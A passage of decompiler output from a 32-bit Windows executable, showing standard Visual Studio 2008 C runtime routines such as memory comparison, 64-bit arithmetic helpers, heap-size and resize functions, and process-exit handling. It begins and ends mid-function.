       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 3) - (uint)*(byte *)((int)_Buf2 + 3);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 4) == *(int *)((int)_Buf2 + 4)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 4);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 4);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 5);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 5);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 6);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 6);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 7) - (uint)*(byte *)((int)_Buf2 + 7);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 8) == *(int *)((int)_Buf2 + 8)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 8);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 8);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 9);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 9);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 10);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 10);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0xb) - (uint)*(byte *)((int)_Buf2 + 0xb);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0xc) == *(int *)((int)_Buf2 + 0xc)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0xc);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0xc);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0xd);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0xd);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0xe);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0xe);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0xf) - (uint)*(byte *)((int)_Buf2 + 0xf);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x10) == *(int *)((int)_Buf2 + 0x10)) {
    iVar3 = 0;
  }
  else {
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x10);
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x10);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x11);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x11);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x12);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x12);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x13) - (uint)*(byte *)((int)_Buf2 + 0x13);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x14) == *(int *)((int)_Buf2 + 0x14)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x14);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x14);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x15);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x15);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x16);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x16);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x17) - (uint)*(byte *)((int)_Buf2 + 0x17);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x18) == *(int *)((int)_Buf2 + 0x18)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x18);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x18);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x19);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x19);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1a);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1a);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1b) - (uint)*(byte *)((int)_Buf2 + 0x1b);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x1c) == *(int *)((int)_Buf2 + 0x1c)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1c);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1c);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1d);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1d);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1e);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1e);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1f) - (uint)*(byte *)((int)_Buf2 + 0x1f);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  _Buf1 = (void *)((int)_Buf1 + 0x20);
  _Buf2 = (void *)((int)_Buf2 + 0x20);
  _Size = _Size - 0x20;
  goto LAB_00417663;
}



// Library Function - Multiple Matches With Different Base Names
//  __vscprintf_helper
//  __vscwprintf_helper
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl
FID_conflict___vscprintf_helper
          (undefined *param_1,int param_2,undefined4 param_3,undefined4 param_4)

{
  int *piVar1;
  undefined4 uVar2;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  
  if (param_2 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0xffffffff;
  }
  else {
    local_20 = 0x7fffffff;
    local_18 = 0x42;
    local_1c = 0;
    local_24 = 0;
    uVar2 = (*(code *)param_1)(&local_24,param_2,param_3,param_4);
  }
  return uVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __vscprintf
//  __vscwprintf
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___vscwprintf(wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = FID_conflict___vscprintf_helper(__woutput_l,(int)_Format,0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  __cfltcvt_init
// 
// Library: Visual Studio 2008 Release

void __cfltcvt_init(void)

{
  PTR_LAB_004339f4 = __cfltcvt;
  PTR_LAB_004339f8 = __cropzeros;
  PTR_LAB_004339fc = __fassign;
  PTR_LAB_00433a00 = __forcdecpt;
  PTR_LAB_00433a04 = __positive;
  PTR_LAB_00433a08 = __cfltcvt;
  PTR_LAB_00433a0c = __cfltcvt_l;
  PTR_LAB_00433a10 = __fassign_l;
  PTR_LAB_00433a14 = __cropzeros_l;
  PTR_LAB_00433a18 = __forcdecpt_l;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2008 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  _DAT_00435f80 = __ms_p5_mp_test_fdiv();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



ulonglong __fastcall FUN_00418930(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_00438ea4 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2008 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  uint uVar3;
  size_t local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    sVar2 = 0xffffffff;
  }
  else {
    if (DAT_00437d4c == 3) {
      __lock(4);
      uVar3 = ___sbh_find_block((int)_Memory);
      if (uVar3 != 0) {
        local_20 = *(int *)((int)_Memory + -4) - 9;
      }
      FUN_00418b64();
      if (uVar3 != 0) {
        return local_20;
      }
    }
    sVar2 = HeapSize(DAT_00436454,0,_Memory);
  }
  return sVar2;
}



void FUN_00418b64(void)

{
  FUN_0041be7c(4);
  return;
}



// Library Function - Single Match
//  _wcscmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _wcscmp(wchar_t *_Str1,wchar_t *_Str2)

{
  int iVar1;
  
  while( true ) {
    iVar1 = (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
    if ((iVar1 != 0) || (*_Str2 == L'\0')) break;
    _Str1 = _Str1 + 1;
    _Str2 = _Str2 + 1;
  }
  if (iVar1 < 0) {
    return -1;
  }
  if (0 < iVar1) {
    iVar1 = 1;
  }
  return iVar1;
}



// Library Function - Single Match
//  __is_LFH_enabled
// 
// Library: Visual Studio 2008 Release

undefined4 __is_LFH_enabled(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  code *pcVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  int *piVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  int local_8;
  
  local_8 = -1;
  if (DAT_00435f84 == 0) {
    hModule = GetModuleHandleW(L"kernel32.dll");
    if (hModule != (HMODULE)0x0) {
      pFVar1 = GetProcAddress(hModule,"HeapQueryInformation");
      DAT_00435f88 = __encode_pointer((int)pFVar1);
    }
    DAT_00435f84 = 1;
  }
  iVar2 = __encoded_null();
  if (DAT_00435f88 != iVar2) {
    uVar8 = 0;
    uVar7 = 4;
    piVar6 = &local_8;
    uVar5 = 0;
    uVar4 = DAT_00436454;
    pcVar3 = (code *)__decode_pointer(DAT_00435f88);
    iVar2 = (*pcVar3)(uVar4,uVar5,piVar6,uVar7,uVar8);
    if ((iVar2 != 0) && (local_8 == 2)) {
      return 1;
    }
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __expand
// 
// Library: Visual Studio 2008 Release

void * __cdecl __expand(void *_Memory,size_t _NewSize)

{
  int *piVar1;
  uint *puVar2;
  int iVar3;
  DWORD DVar4;
  SIZE_T SVar5;
  LPVOID pvVar6;
  LPVOID local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return (void *)0x0;
  }
  if (0xffffffe0 < _NewSize) {
    piVar1 = __errno();
    *piVar1 = 0xc;
    return (void *)0x0;
  }
  if (DAT_00437d4c == 3) {
    __lock(4);
    puVar2 = (uint *)___sbh_find_block((int)_Memory);
    if (((puVar2 != (uint *)0x0) && (local_20 = (void *)0x0, _NewSize <= DAT_00437d58)) &&
       (iVar3 = ___sbh_resize_block(puVar2,(int)_Memory,_NewSize), iVar3 != 0)) {
      local_20 = _Memory;
    }
    FUN_00418d12();
    if (puVar2 != (uint *)0x0) {
      return local_20;
    }
    if (_NewSize == 0) {
      _NewSize = 1;
    }
    _Memory = HeapReAlloc(DAT_00436454,0x10,_Memory,_NewSize + 0xf & 0xfffffff0);
    local_20 = _Memory;
    pvVar6 = _Memory;
  }
  else {
    if (_NewSize == 0) {
      _NewSize = 1;
    }
    SVar5 = HeapSize(DAT_00436454,0,_Memory);
    pvVar6 = HeapReAlloc(DAT_00436454,0x10,_Memory,_NewSize);
    if (pvVar6 != (LPVOID)0x0) {
      return pvVar6;
    }
    local_20 = (LPVOID)0x0;
    if ((0x4000 < SVar5) || (SVar5 < _NewSize)) goto LAB_00418ceb;
    pvVar6 = (LPVOID)__is_LFH_enabled();
  }
  if (pvVar6 != (LPVOID)0x0) {
    return _Memory;
  }
LAB_00418ceb:
  piVar1 = __errno();
  DVar4 = GetLastError();
  iVar3 = __get_errno_from_oserr(DVar4);
  *piVar1 = iVar3;
  return local_20;
}



void FUN_00418d12(void)

{
  FUN_0041be7c(4);
  return;
}



// Library Function - Single Match
//  __crt_waiting_on_module_handle
// 
// Library: Visual Studio 2008 Release

void __cdecl __crt_waiting_on_module_handle(LPCWSTR param_1)

{
  HMODULE pHVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 1000;
  do {
    Sleep(dwMilliseconds);
    pHVar1 = GetModuleHandleW(param_1);
    dwMilliseconds = dwMilliseconds + 1000;
    if (60000 < dwMilliseconds) {
      return;
    }
  } while (pHVar1 == (HMODULE)0x0);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  pcVar1 = (code *)__decode_pointer((int)PTR___exit_00432db0);
  (*pcVar1)(0xff);
  return;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"mscoree.dll");
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"CorExitProcess");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2008 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_00418dff(void)

{
  __lock(8);
  return;
}



void FUN_00418e08(void)

{
  FUN_0041be7c(8);
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_0042acec);
  if (BVar1 != 0) {
    __fpmath(param_1);
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_0042945c,(undefined **)&DAT_00429474);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_0042056c);
    __initterm((undefined **)&DAT_00429458);
    if ((DAT_00438eb8 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00438eb8), BVar1 != 0)) {
      (*DAT_00438eb8)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x00418ff4)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2008 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *local_2c;
  int *local_24;
  int *local_20;
  
  __lock(8);
  if (DAT_00435fbc != 1) {
    _DAT_00435fb8 = 1;
    DAT_00435fb4 = (undefined)param_3;
    if (param_2 == 0) {
      piVar1 = (int *)__decode_pointer(DAT_00438eb0);
      if (piVar1 != (int *)0x0) {
        piVar2 = (int *)__decode_pointer(DAT_00438eac);
        local_2c = piVar1;
        local_24 = piVar2;
        local_20 = piVar1;
        while (piVar2 = piVar2 + -1, piVar1 <= piVar2) {
          iVar3 = __encoded_null();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)__decode_pointer(*piVar2);
            iVar3 = __encoded_null();
            *piVar2 = iVar3;
            (*pcVar4)();
            piVar5 = (int *)__decode_pointer(DAT_00438eb0);
            piVar6 = (int *)__decode_pointer(DAT_00438eac);
            if ((local_20 != piVar5) || (piVar1 = local_2c, local_24 != piVar6)) {
              piVar2 = piVar6;
              piVar1 = piVar5;
              local_2c = piVar5;
              local_24 = piVar6;
              local_20 = piVar5;
            }
          }
        }
      }
      __initterm((undefined **)&DAT_00429484);
    }
    __initterm((undefined **)&DAT_0042948c);
  }
  FUN_00418fee();
  if (param_3 == 0) {
    DAT_00435fbc = 1;
    FUN_0041be7c(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_00418fee(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0041be7c(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2008 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2008 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = __encoded_null();
  FUN_0041cc61(uVar1);
  FUN_004225dc(uVar1);
  FUN_004191f1(uVar1);
  FUN_00421504(uVar1);
  FUN_004225cd(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_0040a744();
  __initp_eh_hooks();
  PTR___exit_00432db0 = (undefined *)__encode_pointer(0x419019);
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2008 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_004360d8 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_004360dc = &stack0x00000004;
  _DAT_00436018 = 0x10001;
  _DAT_00435fc0 = 0xc0000409;
  _DAT_00435fc4 = 1;
  local_32c = DAT_00432c20;
  local_328 = DAT_00432c24;
  _DAT_00435fcc = unaff_retaddr;
  _DAT_004360a4 = in_GS;
  _DAT_004360a8 = in_FS;
  _DAT_004360ac = in_ES;
  _DAT_004360b0 = in_DS;
  _DAT_004360b4 = unaff_EDI;
  _DAT_004360b8 = unaff_ESI;
  _DAT_004360bc = unaff_EBX;
  _DAT_004360c0 = in_EDX;
  _DAT_004360c4 = in_ECX;
  _DAT_004360c8 = in_EAX;
  _DAT_004360cc = unaff_EBP;
  DAT_004360d0 = unaff_retaddr;
  _DAT_004360d4 = in_CS;
  _DAT_004360e0 = in_SS;
  DAT_00436010 = IsDebuggerPresent();
  FUN_00422702();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_0042ad38);
  if (DAT_00436010 == 0) {
    FUN_00422702();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_004191f1(undefined4 param_1)

{
  DAT_004362e4 = param_1;
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2008 Release

void __cdecl
